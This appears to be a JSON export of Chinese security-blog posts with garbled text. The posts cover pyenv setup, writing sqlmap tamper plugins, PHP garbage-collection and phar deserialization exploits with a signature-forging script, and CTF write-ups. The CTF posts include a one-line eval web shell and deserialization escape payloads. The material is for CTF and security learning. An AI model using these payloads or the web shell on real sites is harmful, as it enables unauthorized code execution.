[{"content":"Pyenv Python3 å’Œ Python2 ä¹‹é—´çš„å·®è· ï¼Œ ä»¥åŠPython3.10 çš„æ”¹åŠ¨ Pyenvèƒ½æ–¹ä¾¿çš„ç®¡ç†è¿™äº›ä¸åŒç‰ˆæœ¬å¤„äºåŒä¸€ä¸ªç³»ç»Ÿã€‚å¹¶ä¸”èƒ½å…¨å±€åˆ‡æ¢ä¸åŒçš„Pythonè§£é‡Šå™¨ä»¥åŠPip æ“ä½œç®€å•ï¼Œæ–¹ä¾¿ä¸Šæ‰‹ ä¸€ã€å®‰è£… æˆ‘æ˜¯ Arch Linux ï¼Œç›´æ¥ yay -S pyenv æˆ–è€…pacmanå³å¯\nå®˜æ–¹è„šæœ¬å®‰è£…\n1 2 3 curl https://pyenv.run | bash # or curl -L https://github.com/pyenv/pyenv-installer/raw/master/bin/pyenv-installer | bash äºŒã€é…ç½® bash\n1 2 3 4 5 echo \u0026#39;export PYENV_ROOT=\u0026#34;$HOME/.pyenv\u0026#34;\u0026#39; \u0026gt;\u0026gt; ~/.bash_profile echo \u0026#39;export PATH=\u0026#34;$PYENV_ROOT/bin:$PATH\u0026#34;\u0026#39; \u0026gt;\u0026gt; ~/.bash_profile echo -e \u0026#39;if command -v pyenv 1\u0026gt;/dev/null 2\u0026gt;\u0026amp;1; then\\n eval \u0026#34;$(pyenv init -)\u0026#34;\\nfi\u0026#39; \u0026gt;\u0026gt; ~/.bash_profile # åˆå§‹åŒ– Zsh\n1 2 3 4 5 echo \u0026#39;export PYENV_ROOT=\u0026#34;$HOME/.pyenv\u0026#34;\u0026#39; \u0026gt;\u0026gt; ~/.zshrc echo \u0026#39;export PATH=\u0026#34;$PYENV_ROOT/bin:$PATH\u0026#34;\u0026#39; \u0026gt;\u0026gt; ~/.zshrc echo -e \u0026#39;if command -v pyenv 1\u0026gt;/dev/null 2\u0026gt;\u0026amp;1; then\\n eval \u0026#34;$(pyenv init -)\u0026#34;\\nfi\u0026#39; \u0026gt;\u0026gt; ~/.zshrc # åˆå§‹åŒ– ä¸‰ã€åŸºæœ¬ä½¿ç”¨ ä¸‹è½½çš„ç‰ˆæœ¬ä½ç½®ï¼š~/.pyenv/version/\nåœ¨ä½¿ç”¨ ä¸‹è½½ç‰ˆæœ¬æˆ–è€…è®¾ç½®ç‰ˆæœ¬ çš„å‘½ä»¤ï¼Œä¸è¦åŠ sudoå¦åˆ™å®‰è£…åˆ°rootç¯å¢ƒ\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 pyenv exec # æŒ‡å®špythonç‰ˆæœ¬æ‰§è¡ŒæŸä¸€ä¸ªå‘½ä»¤ pyenv global 3.xxx # è®¾ç½®pythonå…¨å±€ç‰ˆæœ¬ pyenv install # å®‰è£…æŸä¸ªç‰ˆæœ¬çš„Python pyenv versions # è¾“å‡ºå·²ç»å®‰è£…çš„pythonç‰ˆæœ¬ pyenv version # è¾“å‡ºç°åœ¨è®¾ç½®çš„pythonç‰ˆæœ¬ pyenv rehash # å®‰è£…æ–°ç‰ˆæœ¬årehashä¸€ä¸‹ pyenv install -l # è¾“å‡ºå…¨éƒ¨èƒ½å®‰è£…çš„Python ","date":"2023-05-18T11:31:40+08:00","image":"http://main1o.eu.org/image31.png","permalink":"http://main1o.eu.org/p/pyenv/","title":"Pyenv"},{"content":"tamper sqlmap\\tamper æœ‰éå¸¸çµæ´»ä¸”è‡ªå®šä¹‰é«˜çš„æ’ä»¶ Demo:\n1 2 3 4 5 6 7 8 9 10 11 from lib.core.enums import PRIORITY from lib.core.common import singleTimeWarnMessage from lib.core.enums import DBMS __priority__ = PRIORITY.LOW def dependencies(): pass def tamper(payload, **kwargs): return payload æ’ä»¶ç»“æ„åˆ†ä¸º3éƒ¨åˆ†:\nPRIORITY å®šä¹‰tamperçš„ä¼˜å…ˆçº§ ï¼Œå¯¹åº”çš„æ•°å­—è¶Šé«˜ä¼˜å…ˆçº§ä¹Ÿå°±è¶Šå¤§\n1 __priority__ = PRIORITY.LOW å®šä¹‰ä¼˜å…ˆçº§çš„ç±» sqlmap\\lib\\core\\enums.py\n1 2 3 4 5 6 7 LOWEST = -100 LOWER = -50 LOW = -10 NORMAL = 0 HIGH = 10 HIGHER = 50 HIGHEST = 100 æ’ä»¶æç¤º 1 2 def dependencies(): singleTimeWarnMessage(f\u0026#34;æ’ä»¶{os.path.basename(__file__)}åªé’ˆå¯¹{DBMS.MYSQL}\u0026#34;) å‚è€ƒ sqlmap\\lib\\core\\enums.py\ntamper æ ¸å¿ƒå‡½æ•°ï¼Œå¤„ç†payload å’Œè¯·æ±‚å¤´ éœ€è¦å®ç°çš„åŠŸèƒ½éƒ½åœ¨è¿™é‡Œ\npayload ä¸ºsqlmapæ³¨å…¥åŸå§‹è¯­å¥ kwargs åˆ™æ˜¯å¤„ç†è¯·æ±‚å¤´ å¤„ç†å¤šä¸ªæ‹¬å· Demo è™½ç„¶sqlmapé»˜è®¤æ³¨å…¥ä¼šè‡ªåŠ¨é—­åˆå¤šä¸ªæ‹¬å·çš„å‚æ•°ï¼Œä½†æ˜¯è¿™é‡Œè¿˜æ˜¯æƒ³å†™ä¸€ä¸‹\u0026hellip;..\næµ‹è¯•çš„phpä»£ç :\næŠŠåŸå§‹æ³¨å…¥çš„payloadåŠ ä¸Š5ä¸ªå³æ‹¬å·ç”¨æ¥é—­åˆï¼š\n1 2 3 4 5 6 7 def tamper(payload, **kwargs): dicts = payload.split(\u0026#39; \u0026#39;,1) dicts[0] = dicts[0] + \u0026#39;)))))\u0026#39; payload = \u0026#39; \u0026#39;.join(dicts) print(payload)\t# æ‰“å°æŸ¥çœ‹ return payload æ³¨å…¥sqlè¯­å¥åŠ ä¸Šäº†5ä¸ªå³æ‹¬å·\nè¯·æ±‚å¤´ è·å–å­—å…¸ï¼Œæ·»åŠ å…ƒç´ ï¼ŒburpæŠ“åŒ…æŸ¥çœ‹\n1 2 3 def tamper(payload, **kwargs): headers = kwargs.get(\u0026#39;headers\u0026#39;) headers[\u0026#39;User-Agent\u0026#39;] = \u0026#39;main1o\u0026#39; å®Œæ•´ä»£ç ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 import os import random import string from lib.core.common import singleTimeWarnMessage from lib.core.compat import xrange from lib.core.enums import DBMS from lib.core.enums import PRIORITY __priority__ = PRIORITY.NORMAL def dependencies(): singleTimeWarnMessage(f\u0026#34;æ’ä»¶{os.path.basename(__file__)}åªé’ˆå¯¹{DBMS.MYSQL}\u0026#34;) def tamper(payload, **kwargs): headers = kwargs.get(\u0026#39;headers\u0026#39;) headers[\u0026#39;User-Agent\u0026#39;] = \u0026#39;main1o\u0026#39; dicts = payload.split(\u0026#39; \u0026#39;,1) dicts[0] = dicts[0] + \u0026#39;)))))\u0026#39; payload = \u0026#39; \u0026#39;.join(dicts) return payload ","date":"2023-05-18T09:37:33+08:00","image":"http://main1o.eu.org/image46.png","permalink":"http://main1o.eu.org/p/sqlmap_tamper/","title":"Sqlmap_tamper"},{"content":"PHPåº•å±‚ GC åƒåœ¾å›æ”¶æœºåˆ¶ PHP: å¼•ç”¨è®¡æ•°åŸºæœ¬çŸ¥è¯† - Manual\nå»ºè®®ä¸€å®šå…ˆçœ‹å®Œ PHPå®˜æ–¹æ‰‹å†Œçš„è¯´æ˜\nç®€å•ç†è§£ä¸ºä¸€ä¸ªå¯¹è±¡æ²¡æœ‰è¢«å¼•ç”¨çš„æ—¶å€™ å°±ä¼šè¢«GCæœºåˆ¶å›æ”¶ åœ¨è¢«å›æ”¶çš„åŒæ—¶ ä¼šè§¦å‘__destruct()æ–¹æ³• è¿™æ˜¯ä¸€ä¸ªå…³é”®ç‚¹~\nrefcountå˜é‡å¼•ç”¨è®¡æ•° is_refæ˜¯å¦è¢«å¼•ç”¨ boolå€¼\nè°ƒè¯•å·¥å…·Xdebug - Debugger and Profiler Tool for PHP å¦‚æœæ˜¯å°çš®é¢æ¿çš„è¯ç›´æ¥ phpæ‰©å±•å¼€å¯å°±è¡Œäº†\nPHPä¸åŒç‰ˆæœ¬ä¸‹GCæœºåˆ¶æœ‰å˜åŒ– ä»¥ä¸‹ç¯å¢ƒä¸ºPHP 5.4.45æ¨¡æ‹Ÿ\nPHP æ·±æµ…æ‹·è´ åœ¨ PHP ä¸­å¼•ç”¨æ„å‘³ç€ç”¨ä¸åŒçš„åå­—è®¿é—®åŒä¸€ä¸ªå˜é‡å†…å®¹ã€‚è¿™å¹¶ä¸åƒ C çš„æŒ‡é’ˆï¼šä¾‹å¦‚ä½ ä¸èƒ½å¯¹ä»–ä»¬åšæŒ‡é’ˆè¿ç®—ï¼Œä»–ä»¬å¹¶ä¸æ˜¯å®é™…çš„å†…å­˜åœ°å€ã€‚æ›¿ä»£çš„æ˜¯ï¼Œå¼•ç”¨æ˜¯ç¬¦å·è¡¨åˆ«åã€‚æ³¨æ„åœ¨PHP ä¸­ï¼Œå˜é‡åå’Œå˜é‡å†…å®¹æ˜¯ä¸ä¸€æ ·çš„ï¼Œå› æ­¤åŒæ ·çš„å†…å®¹å¯ä»¥æœ‰ä¸åŒçš„åå­—ã€‚æœ€æ¥è¿‘çš„æ¯”å–»æ˜¯ Unix çš„æ–‡ä»¶åå’Œæ–‡ä»¶æœ¬èº«â€”â€”å˜é‡åæ˜¯ç›®å½•æ¡ç›®ï¼Œè€Œå˜é‡å†…å®¹åˆ™æ˜¯æ–‡ä»¶æœ¬èº«ã€‚å¼•ç”¨å¯ä»¥è¢«çœ‹ä½œæ˜¯ Unix æ–‡ä»¶ç³»ç»Ÿä¸­çš„ç¡¬é“¾æ¥\nå¼•ç”¨å–æ¶ˆ åˆ™éœ€è¦ä½¿ç”¨unset()åªæ˜¯æ–­å¼€äº†å˜é‡åå’Œå˜é‡å†…å®¹ä¹‹é—´çš„ç»‘å®š,å¹¶ä¸æ˜¯è¯´å˜é‡å†…å®¹è¢«é”€æ¯äº†\næ·±æ‹·è´ï¼š èµ‹å€¼æ—¶å€¼å®Œå…¨å¤åˆ¶å¯¹å…¶ä¸­ä¸€ä¸ªä½œå‡ºæ”¹å˜ï¼Œä¸ä¼šå½±å“å¦ä¸€ä¸ª\nåœ¨PHP5ä»¥ä¸Šï¼Œå¯¹è±¡çš„ = èµ‹å€¼å’Œä¼ é€’éƒ½æ˜¯å¼•ç”¨(æµ…)ã€‚phpæä¾›äº†cloneå‡½æ•°å®ç°æ‹·è´å‰¯æœ¬\nç›´æ¥æŠŠ$aèµ‹å€¼ç»™$bä¹‹åï¼Œ$bä¿®æ”¹å¹¶ä¸ä¼šå¯¹$aä»»ä½•å½±å“ï¼Œå¯ä»¥çœ‹åˆ°2æ¬¡è¾“å‡ºéƒ½æ˜¯main1o\nå˜é‡$aå¼•ç”¨è®¡æ•°å€¼refcountä¹Ÿä¸º1ï¼Œå¹¶ä¸”is_refä¹Ÿæ˜¯false\nå¯¹è±¡çš„æ·±æ‹·è´ ç”¨cloneå‡½æ•°æ‹·è´å‡ºä¸€ä¸ªå®Œå…¨ä¸€æ ·çš„å¯¹è±¡ï¼Œä¿®æ”¹è¯¥å¯¹è±¡ï¼Œå¹¶ä¸ä¼šå½±å“åŸå§‹å¯¹è±¡\nä¿®æ”¹$aå¯¹è±¡ï¼Œåªä¼šå¯¹$bå¯¹è±¡æœ‰å½±å“ï¼Œå¹¶ä¸ä¼šå¯¹$cå¯¹è±¡æœ‰ä»»ä½•å½±å“\næµ…æ‹·è´ï¼š èµ‹å€¼æ—¶ï¼Œå¼•ç”¨èµ‹å€¼ï¼Œç›¸å½“äºå–äº†ä¸€ä¸ªåˆ«åã€‚å¯¹å…¶ä¸­ä¸€ä¸ªä¿®æ”¹ï¼Œä¼šå½±å“å¦ä¸€ä¸ª\nä½¿ç”¨\u0026amp;æ¥ä½¿ç”¨è‡ªå®šä¹‰å¼•ç”¨å˜é‡ï¼Œæˆ‘ä»¬å¯¹$aè¿›è¡Œä¿®æ”¹ ç›´æ¥å½±å“äº†$b â€œmain1oâ€ \u0026ndash;\u0026gt; \u0026ldquo;ikun\u0026rdquo;\nå°±æ˜¯$a å’Œ$béƒ½æŒ‡å‘å†…å­˜ä¸­çš„åŒä¸€å—åœ°å€\nååºåˆ—åŒ–ä¸­çš„ä½œç”¨ è¡¥å……ï¼š\næ–¹æ³•å ä½œç”¨ __construct æ„é€ å‡½æ•°ï¼Œåœ¨åˆ›å»ºå¯¹è±¡æ—¶å€™åˆå§‹åŒ–å¯¹è±¡ï¼Œä¸€èˆ¬ç”¨äºå¯¹å˜é‡èµ‹åˆå€¼ __destruct ææ„å‡½æ•°ï¼Œå’Œæ„é€ å‡½æ•°ç›¸åï¼Œåœ¨å¯¹è±¡ä¸å†è¢«ä½¿ç”¨æ—¶(å°†æ‰€æœ‰è¯¥å¯¹è±¡çš„å¼•ç”¨è®¾ä¸ºnull)æˆ–è€…ç¨‹åºé€€å‡ºæ—¶è‡ªåŠ¨è°ƒç”¨ å³å¯¹è±¡è¢«é”€æ¯è§¦å‘ï¼æ‰‹åŠ¨é”€æ¯ä¸ºunset(Object) æ‰‹åŠ¨é”€æ¯å¯¹è±¡unset()è§¦å‘äº†$aå¯¹è±¡ä¸­çš„ææ„å‡½æ•°ã€‚æå‰è¾“å‡ºäº† 1__destruct()\nè¿˜æœ‰å¯¹è±¡å¼•ç”¨è¢«è§†ä¸ºnull ä¹Ÿä¼šè§¦å‘ï¼Œè¿™é‡Œä¸¾ä¸ªä¾‹å­\nå˜é‡èµ‹å€¼éƒ½æ˜¯ è‡ªå³å‘å·¦ æ‰€ä»¥æ•°ç»„ä¸­çš„ç¬¬äºŒä¸ªå…ƒç´ 0 è¦†ç›–äº†å¯¹è±¡å¤±å»äº†å¼•ç”¨ï¼Œé‚£ä¹ˆå°±æ»¡è¶³è§¦å‘GCå›æ”¶äº†ã€‚å³è§¦å‘__destruct\nDemo : æœ€åä¸€è¡Œä»£ç é”™è¯¯æŠ›å‡ºå¼‚å¸¸ï¼Œæ˜¯æ— æ³•è§¦å‘__destruct éœ€è¦æ­£å¸¸ç»“æŸç¨‹åº\né‚£æˆ‘ä»¬å°±å¯ä»¥é€šè¿‡ä¸Šé¢ä»‹ç»çš„è§¦å‘GCæœºåˆ¶ æ¥ç»•è¿‡ã€‚è¿™é‡Œå°†ç¬¬äºŒä¸ªç´¢å¼•ç½®ç©ºã€‚\nPayloadï¼š\n1 a:2:{i:0;O:1:\u0026#34;B\u0026#34;:0:{}i:0;i:0;} GC Pharååºåˆ—åŒ–åˆ©ç”¨: Pharååºåˆ—åŒ–ï¼Œä½¿ç”¨file_get_contents()å‡½æ•°ï¼Œå…ˆæŒ‰ç…§æ­£å¸¸æµç¨‹å»ç”Ÿæˆä¸€ä¸ª.pharæ–‡ä»¶\nç”Ÿæˆæ­¥éª¤å°±ä¸ä¸€ä¸€ç´¯è¿°äº†ï¼Œæ³¨æ„éœ€è¦å¼€å¯php.iniä¸­çš„phar.readonly = Off\n1 2 3 4 5 6 7 8 9 10 \u0026lt;?php class test{public $code= \u0026#34;phpinfo();\u0026#34;;} $a = new test(); $c = array($a,0); $b = new Phar(\u0026#39;1.phar\u0026#39;,0); $b-\u0026gt;startBuffering(); $b-\u0026gt;setMetadata($c); $b-\u0026gt;setStub(\u0026#34;\u0026lt;?php __HALT_COMPILER();?\u0026gt;\u0026#34;); $b-\u0026gt;addFromString(\u0026#34;test.txt\u0026#34;,\u0026#34;test\u0026#34;); $b-\u0026gt;stopBuffering(); ç”±äºç”Ÿæˆçš„pharæ–‡ä»¶ä¸èƒ½éšæ„ä¿®æ”¹ï¼Œå¦åˆ™ç­¾åä¸åŒ¹é…ã€‚å…ˆæŒ‰ç…§åŸæ¥çš„æ–¹æ³•ä¿®æ”¹æ•°ç»„å€¼ï¼Œç„¶ååœ¨é€šè¿‡è„šæœ¬è¿›è¡Œä¼ªé€ ç­¾åã€‚\nä½¿ç”¨16è¿›åˆ¶ç¼–è¾‘å™¨æ‰“å¼€ å¯ä»¥çœ‹åˆ°i:1ä¿®æ”¹ä¸ºi:0 ä¿å­˜\nexp.py\n1 2 3 4 5 6 7 8 import gzip from hashlib import sha1 with open(r\u0026#34;1.phar\u0026#34;, \u0026#34;rb\u0026#34;) as file: f = file.read() s = f[:-28] h = f[-8:] newf = s + sha1(s).digest() + h open(\u0026#34;2.phar\u0026#34;,\u0026#34;wb\u0026#34;).write(newf) æ¥ç€ä½¿ç”¨phar:// ä¼ªåè®®åŒ…å«2.pharè¿™ä¸ªæ–‡ä»¶å³å¯,æˆåŠŸæ‰§è¡Œäº†\nğŸ”—å‚è€ƒé“¾æ¥ PHPæ–°çš„åƒåœ¾å›æ”¶æœºåˆ¶ (yangxikun.com)\nPHPçš„GCæœºåˆ¶ - M1kaelâ€˜s Blog\næµ…æPHP GCåƒåœ¾å›æ”¶æœºåˆ¶åŠå¸¸è§åˆ©ç”¨æ–¹å¼ - å…ˆçŸ¥ç¤¾åŒº (aliyun.com)\n","date":"2023-01-20T00:00:00Z","image":"http://main1o.eu.org/%E5%A4%AA%E7%A9%BA%E5%A2%99%E7%BA%B8.jpg","permalink":"http://main1o.eu.org/p/php%E5%BA%95%E5%B1%82_gc_%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E6%9C%BA%E5%88%B6/","title":"PHPåº•å±‚_GC_åƒåœ¾å›æ”¶æœºåˆ¶"},{"content":"2022å¼ºç½‘å…ˆé”‹ rcefile ç¯å¢ƒä¸‹è½½åœ°å€\nä»£ç å®¡è®¡\nspl_autoload_register è¯´æ˜\nspl_autoload_register()åœ¨æ²¡æœ‰é™åˆ¶çš„æƒ…å†µï¼Œnewæœ‰ä¸€ä¸ªå½“å‰ä¸å­˜åœ¨çš„ç±»testï¼Œspl_autoload_registerä¼šè‡ªåŠ¨å»å½“å‰ç›®å½•ä¸‹åŒ…å«æ–‡ä»¶åä¸ºtest.php æˆ–è€…æ˜¯test.inc\nunserializeååºåˆ—åŒ–æœ¬åœ°cookie[\u0026lsquo;userfile\u0026rsquo;]\nupload.php\nåœ¨39è¡Œé»‘åå•ä¸­å¹¶æ²¡æœ‰å¯¹ phar åç¼€è¿›è¡Œè¿‡æ»¤\nä¸Šä¼ æ–‡ä»¶ 1.jpg å†…å®¹\n1 2 3 4 \u0026lt;?php phpinfo(); eval($_POST[\u0026#39;a\u0026#39;]); ä¿®æ”¹åç¼€ ä¸º 1.phar å¹¶ æŸ¥çœ‹å›¾ç‰‡è·å–é‡å‘½åä¹‹åçš„å›¾ç‰‡åç§°\nä½¿ç”¨è¿™ä¸ªåç§°å»æ„å»ºä¸€ä¸ªåºåˆ—åŒ–å¯¹è±¡ ï¼Œconfig.inc.phpå»cookieé‡Œæ‰¾ï¼Œå¹¶è¿›è¡Œååºåˆ—åŒ–ã€‚è§¦å‘**spl_autoload_register()**å»åŒ…å«\nafd4b9668ced586e2528dc1863a650fd.inc\n1 2 3 4 5 6 7 8 9 10 11 \u0026lt;?php class afd4b9668ced586e2528dc1863a650fd{ # ä¸èƒ½æ•°å­—å¼€å¤´ function __construst(){ } } $s = new afd4b9668ced586e2528dc1863a650fd(); echo serialize($s); # O:32:\u0026#34;afd4b9668ced586e2528dc1863a650fd\u0026#34;:0:{} ","date":"2022-08-24T00:00:00Z","image":"http://main1o.eu.org/1.png","permalink":"http://main1o.eu.org/p/2022%E5%BC%BA%E7%BD%91%E6%9D%AF%E7%BA%BF%E4%B8%8A/","title":"2022å¼ºç½‘æ¯çº¿ä¸Š"},{"content":"Phpååºåˆ—åŒ–å­—ç¬¦é€ƒé€¸ ä¸ªäººç†è§£çš„å­—ç¬¦é€ƒé€¸\nå­—ç¬¦å¢åŠ  demo_1: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 \u0026lt;?php error_reporting(0); highlight_file(__FILE__); class ik{ public $username = \u0026#39;m\u0026#39;; public $password = \u0026#39;ikun\u0026#39;; public function __construct($username){ $this-\u0026gt;username = $username; } public function __wakeup(){ if($this-\u0026gt;password === \u0026#39;ik\u0026#39;){ include(\u0026#39;flag.php\u0026#39;); echo PHP_EOL . $flag; # flag.php -\u0026gt; flag{this_flag} }else{ echo \u0026#34;å“å‘¦ ä½ å¹²å˜›~\u0026#34;; } } } function filter($obj){ return str_replace(\u0026#39;l\u0026#39;,\u0026#39;ll\u0026#39;,$obj); } $username = $_GET[\u0026#39;a\u0026#39;]; $obj = serialize(new ik($username)); $ter = filter($obj); unserialize($ter); __wakeup()é­”æœ¯æ–¹æ³•ä¼šåœ¨ååºåˆ—åŒ–æ—¶ï¼Œåˆ¤æ–­å±æ€§passwordæ˜¯å¦æ˜¯ikç„¶ååœ¨å¼•å…¥flagã€‚ä½†æ˜¯ç±»ä¸­å”¯ä¸€çš„ä¼ å€¼ç‚¹å°±åœ¨**$username**\nfilter()æ–¹æ³•å¯¹ç±»ikçš„å¯¹è±¡è¿›è¡Œæ›¿æ¢ä¼šå¤šå‡ºä¸€ä¸ªå­—ç¬¦ï¼Œååºåˆ—åŒ–æ˜¯ä»å·¦å¾€å³è¯»çš„,åªè¯»é”®çš„é•¿åº¦,å¤šå‡ºäº†å­—ç¬¦å°±å¿½ç•¥ï¼Œé‚£ä¹ˆè¿™ä¸ªå°±å«å­—ç¬¦é€ƒé€¸ã€‚å¯ä»¥å¯¹**$usernameè¿›è¡Œé€ƒé€¸ï¼Œä»è€Œè¦†ç›–åˆ°$password**\n1 2 3 O:4:\u0026#34;demo\u0026#34;:1:{s:4:\u0026#34;name\u0026#34;;s:2:\u0026#34;iki\u0026#34;;} # 2:\u0026#34;iki\u0026#34; è¿™é‡Œé”®çš„é•¿åº¦ä¸º3ï¼Œåªè¯»é”®çš„é•¿åº¦å¤šäº†ä¸€ä¸ªiã€‚ä»å·¦å¾€å³è¯»ï¼Œé‚£ä¹ˆè¿™ä¸ª\u0026#39;}\u0026#39;å°±æ˜¯é€ƒé€¸(å¿½ç•¥)äº†çš„ æ¯”å¦‚:\n1 2 3 4 5 6 7 8 \u0026lt;?php class ik{ public $username = \u0026#39;m\u0026#39;; public $password = \u0026#39;ik\u0026#39;; } print_r(serialize(new ik())); # O:2:\u0026#34;ik\u0026#34;:2:{s:8:\u0026#34;username\u0026#34;;s:1:\u0026#34;m\u0026#34;;s:8:\u0026#34;password\u0026#34;;s:2:\u0026#34;ik\u0026#34;;} è¿™\u0026quot;;s:8:\u0026quot;password\u0026quot;;s:2:\u0026quot;ik\u0026quot;;}å°±æ˜¯è¦é€ƒé€¸çš„å­—ç¬¦æ•°é‡27ã€‚phpé€šè¿‡;}æ¥åˆ¤æ–­ååºåˆ—åŒ–çš„ç»“æŸæ ‡å¿—ã€‚å› ä¸ºä¹‹å‰çš„filter()å°†1ä¸ªlæ›¿æ¢ä¸º2ä¸ªlï¼Œå¤šäº†ä¸€ä¸ªlã€‚æ‰€ä»¥è¦é€ƒé€¸æˆ‘ä»¬çš„payloadéœ€è¦27ä¸ªlç„¶åæ‹¼æ¥\n1 lllllllllllllllllllllllllll\u0026#34;;s:8:\u0026#34;password\u0026#34;;s:2:\u0026#34;ik\u0026#34;;} demo_2: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 \u0026lt;?php error_reporting(0); highlight_file(__FILE__); class ik{ public $username = \u0026#39;m\u0026#39;; public $password = \u0026#39;ik\u0026#39;; public function __construct($username){ $this-\u0026gt;username = $username; } public function __wakeup(){ if($this-\u0026gt;password === \u0026#39;ikun\u0026#39;){ include(\u0026#39;flag.php\u0026#39;); echo PHP_EOL . $flag; # flag.php -\u0026gt; flag{this_flag} }else{ echo \u0026#34;å“å‘¦ ä½ å¹²å˜›~\u0026#34;; } } } function filter($obj){ return str_replace(\u0026#39;main1o\u0026#39;,\u0026#39;main1oikun\u0026#39;,$obj); } $username = $_GET[\u0026#39;a\u0026#39;]; $obj = serialize(new ik($username)); $ter = filter($obj); unserialize($ter); å’Œdemo_1ç±»ä¼¼çš„ï¼Œä¸è¿‡filteræ¯æ¬¡æ›¿æ¢å¤š4ä¸ªå­—ç¬¦ï¼Œpayloadï¼š\n1 2 3 4 5 6 7 8 \u0026lt;?php class ik{ public $username = \u0026#39;m\u0026#39;; public $password = \u0026#39;ikun\u0026#39;; } print_r(serialize(new ik())) # O:2:\u0026#34;ik\u0026#34;:2:{s:8:\u0026#34;username\u0026#34;;s:1:\u0026#34;m\u0026#34;;s:8:\u0026#34;password\u0026#34;;s:4:\u0026#34;ikun\u0026#34;;} \u0026quot;;s:8:\u0026quot;password\u0026quot;;s:4:\u0026quot;ikun\u0026quot;;}æ˜¯éœ€è¦é€ƒé€¸çš„å­—ç¬¦ä¸€å…±29ã€‚ä½†æ˜¯ï¼Œä½¿ç”¨7ä¸ªmain1oï¼Œåˆ™ä¼šå°‘ä¸€ä¸ªå­—ç¬¦ï¼Œä½¿ç”¨8ä¸ªmain1o åˆ™ä¼šå¤š3ä¸ªã€‚æˆ‘ä»¬é€‰æ‹©8ä¸ªmain1o ï¼Œåªéœ€è¦åœ¨éœ€è¦é€ƒé€¸çš„å­—ç¬¦ï¼Œåé¢åœ¨æ·»åŠ 3ä¸ªä»»æ„å­—ç¬¦ä»£æ›¿å³å¯ã€‚\n1 2 3 main1omain1omain1omain1omain1omain1omain1omain1o\u0026#34;;s:8:\u0026#34;password\u0026#34;;s:4:\u0026#34;ikun\u0026#34;;}aaa # æ·»åŠ 3ä¸ªa å­—ç¬¦å‡å°‘ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 \u0026lt;?php error_reporting(0); highlight_file(__FILE__); $arr[\u0026#39;user\u0026#39;] = $_GET[\u0026#39;user\u0026#39;]; $arr[\u0026#39;pass\u0026#39;] = $_GET[\u0026#39;pass\u0026#39;]; function filter($str){ return str_replace(\u0026#39;aa\u0026#39;,\u0026#39;a\u0026#39;,$str); } $q = serialize($arr); $w = filter($q); echo \u0026#39;è¿‡æ»¤å‰:\u0026#39;. $q . \u0026#39;\u0026lt;/br\u0026gt;\u0026#39;; echo \u0026#39;è¿‡æ»¤å:\u0026#39;. $w . \u0026#39;\u0026lt;/br\u0026gt;\u0026#39;; $e = unserialize($w); echo \u0026#39;pass = \u0026#39; . $e[\u0026#39;pass\u0026#39;]; æ­£å¸¸ä¼ å‚\nåŠ å…¥aaåè¢«è¿‡æ»¤äº†çš„ï¼Œå¯¼è‡´å°‘äº†ä¸€ä¸ªå­—ç¬¦ã€‚æ‰€ä»¥å‘åé¢åƒæ‰ä¸€ä¸ªå­—ç¬¦ï¼Œå¯¼è‡´ååºåˆ—åŒ–å¤±è´¥\nåä¹‹ï¼Œåªéœ€è¦è®¡ç®—å‡ºå®ƒéœ€è¦åƒæ‰çš„å­—ç¬¦ï¼Œåœ¨æ·»åŠ å­—ç¬¦å¡«è¡¥ï¼Œå³å¯ååºåˆ—åŒ–æˆåŠŸã€‚\næˆ‘ä»¬çš„payloadä¸€å…±27ä¸ªå­—ç¬¦ \u0026quot;;s:4:\u0026quot;pass\u0026quot;;s:6:\u0026quot;123456\u0026quot;;} çŸ¥é“2ä¸ªaaä¼šå˜ä¸€ä¸ªaï¼Œæ‰€ä»¥aéœ€è¦57ä¸ª(payload * 2)\naaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\u0026amp;pass=\u0026quot;;s:4:\u0026quot;pass\u0026quot;;s:6:\u0026quot;123456\u0026quot;;}\nç´«è‰²çš„passä¸ºé”®ï¼Œ27ä¸ªå­—ç¬¦ä¸ºæˆ‘ä»¬çš„payloadå‰é¢æœ‰\u0026quot;å½¢æˆé—­åˆã€‚ç´«è‰²éƒ¨åˆ†ä¸º19ä¸ªå­—ç¬¦ï¼Œæ‰€ä»¥å¡«å……å­—ç¬¦ä¸º8ä¸ª ï¼ˆ54å‡å»çº¢è‰²çš„27ä¸ªaå‡å»ç´«è‰²éƒ¨åˆ†19ï¼‰\nä»»æ„å¡«å……8ä¸ªå³å¯ï¼š\n","date":"2022-08-24T00:00:00Z","image":"http://main1o.eu.org/image1.png","permalink":"http://main1o.eu.org/p/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%97%E7%AC%A6%E9%80%83%E9%80%B8/","title":"ååºåˆ—åŒ–å­—ç¬¦é€ƒé€¸"},{"content":"[SWPUCTF 2018]SimplePHP ä»»æ„æ–‡ä»¶åŒ…å«ï¼Ÿ\nå¤§æ¦‚æœ‰è¿™å‡ ä¸ªæ–‡ä»¶ã€‚å¯ä»¥è¯»å–file.phpï¼Œfunction.phpï¼Œclass.phpï¼Œbase.phpæ–‡ä»¶çš„æºç \nfile.php\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 \u0026lt;?php header(\u0026#34;content-type:text/html;charset=utf-8\u0026#34;); include \u0026#39;function.php\u0026#39;; include \u0026#39;class.php\u0026#39;; ini_set(\u0026#39;open_basedir\u0026#39;,\u0026#39;/var/www/html/\u0026#39;); $file = $_GET[\u0026#34;file\u0026#34;] ? $_GET[\u0026#39;file\u0026#39;] : \u0026#34;\u0026#34;; if(empty($file)) { echo \u0026#34;\u0026lt;h2\u0026gt;There is no file to show!\u0026lt;h2/\u0026gt;\u0026#34;; } $show = new Show(); if(file_exists($file)) { $show-\u0026gt;source = $file; $show-\u0026gt;_show(); // è¿™é‡Œä¼ çš„ $file åˆ° class.phpæ–‡ä»¶ä¸­å»å½¢æˆæ–‡ä»¶è¯»å–äº† } else if (!empty($file)){ die(\u0026#39;file doesn\\\u0026#39;t exists.\u0026#39;); } ?\u0026gt; 